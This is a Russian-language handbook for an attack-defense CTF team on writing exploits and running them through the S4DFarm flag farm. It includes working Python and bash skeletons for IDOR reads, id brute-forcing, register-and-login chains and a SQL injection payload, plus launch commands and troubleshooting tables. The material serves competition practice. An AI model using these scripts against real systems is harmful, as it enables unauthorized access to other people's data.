# SPLOITS.md — сплойты: писать, отлаживать, запускать (полный справочник)

Офлайн-книга про одно: нашёл уязвимость → превратил в сплойт → ферма долбит
ими все команды. Прочитай один раз до игры, держи открытым во время.

---

## 0. Контракт сплойта — выучи как таблицу умножения

Ферма знает про твой сплойт ровно ТРИ вещи:

```
1. запуск:   sploit.py <ip команды>     ← единственный аргумент
2. вывод:    флаги в stdout, по одному в строке
3. время:    уложиться в период атаки, иначе прибьют
```

Язык — любой, метод — любой. Ферма — курьер: выцепит из stdout строки,
похожие на флаг (`[A-Z0-9]{31}=`), и отвезёт их в жюри. ВСЁ остальное —
твоя забота: как добыть эти строки.

## 1. Путь флага — вся механика на одной схеме

```
[твой sploit.py <ip>] --stdout--> [клиент фермы: каждые N сек запускает
                                      сплойт против КАЖДОЙ команды из TEAMS]
                                  --> [сервер фермы: копит, каждые 2 сек
                                         пачкой ≤100]
                                  --> [жюри: PUT /flags + TEAM_TOKEN]
                                  --> [Elo: тебе +очки, жертве -очки]
                                  --> [борда]
```

Следствия, которые снимают половину вопросов:
- «отправить всем» — НЕ твоя работа: замени IP на argv[1], остальное
  делает клиент;
- сплойт падает → падает только его прогон, ферма продолжает;
- флаг старше 5 раундов не примут → период атаки должен быть меньше
  жизни флага (на игре: раунд 120 c → период 110–115 c).

## 2. Где искать уязвимость (метод, 15 минут на сервис)

1. **Свой бокс = полигон.** Исходники лежат у тебя, у всех они одинаковие.
   Всё, что воспроизводится на своём боксе, работает и на чужих.
2. **Чекер = карта флага.** Чекер кладёт флаг как честный пользователь:
   register → создать объект → записать флаг. Повтори это руками (curl /
   браузер / Burp) и задай вопрос: «что видит АНОНИМ? что видит ДРУГОЙ
   юзер? что видно по перебору id?»
3. **attack_data** (`GET http://<жюри>/api/client/attack_data/`) — для
   pfr-сервисов жюри отдаёт публичные координаты флагов ПО КАЖДОЙ КОМАНДЕ:
   id объектов, юзернеймы. Это готовые id для IDOR — не гадай.
4. **grep по исходникам**: роуты без auth-декоратора, `WHERE` без
   владельца, `eval/exec/deserialize`, upload без проверок.

## 3. Классы уязвимостей → форма сплойта

У каждого класса — своя форма кода. Найди свой случай ниже.

### 3.1 Открытая ручка / IDOR («прочитать чужое без прав»)

Симптом: GET-ручка не проверяет сессию/владельца; или id перебирается.

```python
#!/usr/bin/env python3
import sys, re, requests

ip = sys.argv[1]
s = requests.Session()

ids = ["1231", "1232"]          # или из attack_data (см. скелет 5.4)
for oid in ids:
    r = s.get(f"http://{ip}:8080/api/note/{oid}", timeout=10)
    for flag in re.findall(r"[A-Z0-9]{31}=", r.text):
        print(flag, flush=True)
```

### 3.2 Логическая ошибка («правило работает не так»)

Симптом: формула/проверка пропускает не туда (средний балл пустого курса
= максимум; скидка при отрицательном количестве; и т.п.).

Форма сплойта: **свой аккаунт → повторить легальный сценарий → шаг,
который обходит правило**. Обычно требует register + login, потом
действия по цепочке, потом чтение объекта с флагом.

### 3.3 Инъекция (SQL/NoSQL/шаблон/команда)

Симптом: твой ввод попадает в запрос/шаблон/шелл.

```python
r = s.post(f"{BASE}/api/search", json={"q": "' OR 1=1 --"})
# флаги поедут в выдаче «всех записей» — выцепи регуляркой
```

### 3.4 Десериализация / eval

Симптом: сервер восстанавливает объект из твоих данных (pickle, YAML,
самописный serialize) или выполняет строку.

Форма сплойта: отправить_payload, который разворачивается в чтение
чужих данных (или в выполнение кода — тогда просто прочитай БД/файлы
и выплюнь флаги в ответ).

### 3.5 Слепой перебор

Симптом: объектов не видать, но они доступны по предсказуемым id/именам.

Форма сплойта: перебор диапазона + фильтр формата. ОГРАНИЧИВАЙ диапазон:
за период атаки надо успеть. Перебор 1–1000 объектов — да; 1–10⁶ — нет.

## 4. От находки к сплойту: две дороги

### 4.1 Экспресс: bash + curl (2 минуты, один запрос)

Нашёл в Burp → правый клик по запросу → **«Copy as curl (bash)»** →
вставить в файл → заменить хост на `$1` → фильтр флага:

```bash
#!/bin/bash
# idor_note.sh — IDOR на /api/note
curl -s "http://$1:8080/api/note/1231" -H "Cookie: session=abc" \
    | grep -oE "[A-Z0-9]{31}="
```

```bash
chmod +x idor_note.sh
./idor_note.sh <свой_ip>              # ручной тест — флаг?
# в бой:
python3 start_sploit.py idor_note.sh --server-url http://<капитан>:5137 --server-pass <пароль>
```

Нюансы: валидация клиента (shebang/flush) действует ТОЛЬКО на
`.py/.pl/.rb` — bash-сплойту достаточно shebang + chmod +x. curl пишет
в stdout сразу, флаги не теряются. Идеально для «один запрос = флаги».

### 4.2 Полный: python (10 минут)

Нужен, если: требуются свои креды (register+login), перебор, attack_data,
сложная логика. Скелеты — в §5. Отправная точка в репо:
`sploits/template.py` (уже соблюдает все правила).

**Почему нельзя просто скопировать Burp-запрос с куки:** куки/токены
протухнут к следующему циклу. Боевой сплойт сам получает свежую сессию
каждый запуск — как чекер.

## 5. Готовые скелеты — копируй и правь

Общее для всех: `ip = sys.argv[1]`, таймаут на каждый запрос,
`print(..., flush=True)`, обработка исключений, фильтр формата.

### 5.1 Одиночный анонимный запрос

```python
#!/usr/bin/env python3
import sys, re, requests

ip = sys.argv[1]
r = requests.get(f"http://{ip}:8080/api/notes/all", timeout=10)
for flag in re.findall(r"[A-Z0-9]{31}=", r.text):
    print(flag, flush=True)
```

### 5.2 Свои креды (register + login + уязвимый запрос)

```python
#!/usr/bin/env python3
import sys, re, secrets, requests

ip = sys.argv[1]
BASE = f"http://{ip}:8080/api"
s = requests.Session()

u, p = "atk" + secrets.token_hex(4), "P" + secrets.token_hex(6)
s.post(f"{BASE}/register", json={"username": u, "password": p}, timeout=10)
s.post(f"{BASE}/login",    json={"username": u, "password": p}, timeout=10)

r = s.get(f"{BASE}/note/1231", timeout=10)      # ← твоя дырка
for flag in re.findall(r"[A-Z0-9]{31}=", r.text):
    print(flag, flush=True)
```

### 5.3 Слепой перебор диапазона

```python
#!/usr/bin/env python3
import sys, re, requests

ip = sys.argv[1]
BASE = f"http://{ip}:8080/api"
s = requests.Session()
seen = set()
try:
    for oid in range(1000, 2000):                    # разумный диапазон!
        try:
            r = s.get(f"{BASE}/note/{oid}", timeout=5)
        except requests.RequestException:
            continue
        for flag in re.findall(r"[A-Z0-9]{31}=", r.text):
            if flag not in seen:
                seen.add(flag)
                print(flag, flush=True)
except Exception as e:
    print(f"[!] {e}", file=sys.stderr)   # диагностика — в stderr, не в stdout!
```

### 5.4 С attack_data (pfr: готовые id по каждой команде)

```python
#!/usr/bin/env python3
import sys, re, os, requests

sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                             "..", "forcad"))
from forcad import flag_ids_for            # хелпер из репо

ip = sys.argv[1]
BASE = f"http://{ip}:8080/api"
s = requests.Session()

ids = flag_ids_for("SERVICE_NAME", ip) or []   # публичные id для ЭТОЙ команды
for oid in ids:
    try:
        r = s.get(f"{BASE}/note/{oid}", timeout=10)
    except requests.RequestException:
        continue
    for flag in re.findall(r"[A-Z0-9]{31}=", r.text):
        print(flag, flush=True)
```

(переменные окружения: `GAME_URL=http://10.10.10.10` на игре)

## 6. Правила боевого сплойта — 7 штук

1. **Не падать.** Любой сценарий — try/except. Упавший сплойт = 0 флагов
   за цикл, и ты этого не заметишь без `-v`.
2. **Таймауты на каждый запрос** — зависший чужой сервис не должен вешать
   весь твой прогон.
3. **`print(flag, flush=True)`** — иначе клиент их не увидит/потеряет.
   (Для .py это ещё и условие валидации.)
4. **stdout — только флаги.** Вся диагностика — в `stderr`.
5. **Фильтр формата** (`[A-Z0-9]{31}=`): чекер ЗАСОРЯЕТ сервис мусорными
   данными, не печатай всё подряд.
6. **Без состояния.** Каждый запуск самодостаточен: ферма перезапускает
   сплойт бесконечно, ничего между запусками не сохранится.
7. **Успевай в период.** Медленный сплойт = мёртвый сплойт: клиент убивает
   его по таймауту. Перебор 1000 объектов — да, 10⁶ — нет.

## 7. Запуск: откуда, как и с чем

### 7.1 Откуда запускать

Клиент (`start_sploit.py`) запускается на **атакующей машине** (Kali),
которая видит и ферму, и вулнбоксы команд. НЕ на своём вулнбоксе.
Директория: `repos/S4DFarm/client/` из этого репозитория.

Единственные зависимости: `python3` + `requests` (оба уже есть после
`install.sh`). Интернет не нужен вообще: ферма локальная, сплойты твои.

### 7.2 Стандартная команда

```bash
cd ~/vanya_ctf_superfarm/repos/S4DFarm/client

python3 start_sploit.py ~/vanya_ctf_superfarm/sploits/МОЙ_СПЛОЙТ.py \
    --server-url http://<ip_капитана>:5137 \
    --server-pass <пароль из .env> \
    --attack-period 110
```

Остановить: `Ctrl+C`. Фоново: добавь `&` или запускай в отдельном
окне/tmux — по одному процессу клиента НА СПЛОЙТ.

### 7.3 Все полезные опции клиента

| Опция | Что делает | Когда ставить |
|---|---|---|
| `sploit` (позиционный) | путь к файлу сплойта | обязателен |
| `--server-url` | адрес морды фермы | обязателен |
| `--server-pass` | пароль из `.env` | обязателен |
| `--attack-period N` | цикл атаки, сек | **110–115 на игре** (раунд 120 c); 55 на репетиции с раундом 60 c |
| `-v N` | показывать вывод первых N циклов | при отладке сплойта |
| `--pool-size N` | параллелизм прогонов | поднять, если команд > 50 |
| `--distribute K/N` | работать только над K-й из N частей списка | несколько атакующих машин без neo (1/3, 2/3, 3/3) |
| `-e` | без таймаутов на сплойты | осторожно: зависший сплойт не убьют |

Время на один прогон сплойта клиент считает сам:
`attack_period / ceil(команды / pool_size)` — при 50-пулле и ≤50 командах
это весь период.

### 7.4 Несколько сплойтов одновременно

Один процесс клиента = один сплойт. Несколько уязвимостей → несколько
процессов (отдельные терминалы / окна tmux):

```bash
python3 start_sploit.py sploits/a.py ... &   # терминал 1
python3 start_sploit.py sploits/b.py ... &   # терминал 2
```

Все они складывают флаги в одну ферму — жюри видит один поток от
команды, дедупликация общая.

### 7.5 Проверка, что всё живо (30 секунд)

```bash
# ферма отвечает?
curl -s -H "Authorization: <пароль>" http://<капитан>:5137/api/teams
# сплойт работает руками?
python3 sploits/МОЙ.py <ip_любой_команды>
# жюри вообще принимает флаги? (сдаст 1 флаг и покажет ответ)
echo 'ФЛАГ' | TEAM_TOKEN=<токен> python3 forcad/thrower.py
```

## 8. Ошибки: симптом → причина → лечение

### Ошибки запуска клиента

| Симптом | Причина | Лечение |
|---|---|---|
| `No such file: ...` | неверный путь к сплойту (клиент лежит в `repos/S4DFarm/client`, сплойт — где угодно, путь указывай точно) | абсолютный путь или `./`-относительный |
| `Sploit won't be run because of validation errors` + «shebang» | нет `#!/usr/bin/env python3` в первой строке (для .py/.pl/.rb) | добавить shebang |
| та же ошибка + «flush()» | в .py-сплойте нет `flush` | `print(..., flush=True)` |
| `Can't get config from the server` | неверные `--server-url`/`--server-pass`, ферма не поднята | `docker compose ps` на капитане; проверить пароль из `.env` |
| клиент молчит после старта | всё нормально: ждёт первый цикл (до `--attack-period` секунд) | посмотреть логи первого цикла с `-v 3` |

### Поведение сплойта

| Симптом | Причина | Лечение |
|---|---|---|
| руками флаг есть, у фермы `Got 0 flags` | сплойт не влезает в период: клиент убивает его до финиша | `--attack-period` больше (или ускорить сплойт — сократить перебор, убрать sleep) |
| `Got 0 flags` на всех | фильтр формата не совпадает (проверь реальный флаг глазами), или сплойт падает | запустить руками + смотреть stderr; `-v 5` |
| падает на части команд | чужие боксы «другие»: данные/состояние отличаются | try/except на каждый запрос, не падать вообще |
| один прогон занял весь период | перебор слишком широкий | сузить диапазон / использовать attack_data |

### Статусы флагов в морде — что каждый значит

| Статус в UI | Что это | Твоё действие |
|---|---|---|
| **Accepted** | зачтён, очки пошли | ничего — работает |
| Rejected: `your own` | это флаг ВАШЕЙ команды (свой бокс в списке целей) | вычеркнуть себя из TEAMS |
| Rejected: `already stolen` | флаг уже сдали (вы или соратник) | норма при дублях; следить, чтобы две машины не бегали по одному списку (`--distribute`) |
| Rejected: `invalid/too old` | флаг протух (старше 5 раундов) или мусор не-флаг | уменьшить период; почистить фильтр формата |
| Queued / `game not started` | жюри ещё не приняло, ферка повторит | подождать; проверить, что игра стартовала на борде |

## 9. Полный порядок «не работает» (отладочная шпаргалка)

```
1. Ферма жива?            curl /api/teams с паролем → список команд?
2. Сплойт жив руками?     python3 sploit.py <ip> → флаги в терминале?
3. Клиент вообще стартовал? -v 3: он запускает сплойт? какие ошибки?
4. Периоды?               сплойт успевает за attack-period? (замерь временем)
5. Флаги дошли до фермы?  морда: флаги есть, какой статус?
6. Жюри приняло?          статус Accepted / ответ жюри в морде
```

Двигайся по списку сверху вниз — первая точка, где ломается, и есть
проблема. Никогда не дебагай вслепую на шаге 6, не проверив шаги 1–5.

## 10. Без интернета — что уже в репо

- `forcad/forcad.py` — клиент API жюри (teams / attack_data / сдача)
  и хелперы для сплойтов (`flag_ids_for`, `extract_flags`);
- все скелеты из §5 — только stdlib + requests;
- `checklib` НЕ обязателен для своих сплойтов (он удобен для
  генерации кредов, ставится при `install.sh`, но скелеты его не требуют);
- ферма, neo-клиенты, PLAYBOOK, FARM.md, CHEATSHEET — всё локально.

Интернет на игре нужен ровно в одном случае: поставить пакет, которого
нет (`pip3 install <пакет>` через прокси — только если очень надо).
Грамотно сплойт пишется на stdlib+requests — как все скелеты выше.
